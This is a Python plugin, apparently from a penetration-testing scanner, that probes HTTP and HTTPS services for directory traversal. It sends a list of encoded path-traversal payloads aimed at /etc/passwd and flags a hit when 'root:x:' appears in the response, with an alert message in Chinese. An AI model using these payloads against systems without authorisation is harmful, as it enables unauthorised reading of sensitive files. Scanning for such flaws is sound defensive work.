#!/usr/bin/env python
# -*- coding: utf-8 -*-

from lib.poc.dummy import *
import ssl


@http_scan
async def do_scan(ip, port, service, is_http, task_msg):
    path_list = ['/../../../../../../../../../../etc/passwd',
                 '/..//..//..//..//..//..//..//..//..//etc//passwd',
                 '/.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./etc/passwd',
                 '/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/'
                 '%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd',
                 '/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/etc/passwd',
                 '/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd',
                 '/..%2f/..%2f/..%2f/..%2f/..%2f/..%2f/..%2f/..%2f/etc/passwd',
                 '/%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./etc/passwd',
                 '/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e'
                 '/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cpasswd',
                 ]

    payload = "GET {} HTTP/1.1\r\n" + \
              "Host: {}\r\n".format(ip) + \
              "User-Agent: {}\r\n".format(GLOBAL_USER_AGENT) + \
              "Connection: close\r\n\r\n"

    for path in path_list:
        try:
            if service == 'https':
                ssl_context = ssl._create_unverified_context()
                reader, writer = await asyncio.open_connection(ip, port, ssl=ssl_context)
            else:
                reader, writer = await asyncio.open_connection(ip, port)
            writer.write(payload.format(path).encode())
            await writer.drain()
            data = await asyncio.wait_for(reader.read(1000), 5)
            writer.close()
            try:
                await writer.wait_closed()    # application data after close notify (_ssl.c:2730)
            except Exception as e:
                pass

            if data.decode().find("root:x:") >= 0:
                base_url = '%s://%s:%s' % (service, ip, port)
                ret = {
                    'alert_group': 'Directory Traversal',
                    'affects': base_url,
                    'details': u'通过该漏洞读取系统内任意文件，造成信息泄露及入侵。 漏洞URL为:\n\n' +
                               base_url + path
                }
                return ret
        except (UnicodeError, OSError) as e:
            pass
        except Exception as e:
            debug(e)

    return ""


if __name__ == '__main__':
    scan = do_scan('easypen-test.lijiejie.com', 18888, 'HTTP', True, task_msg={})
    run_plugin_test(scan)
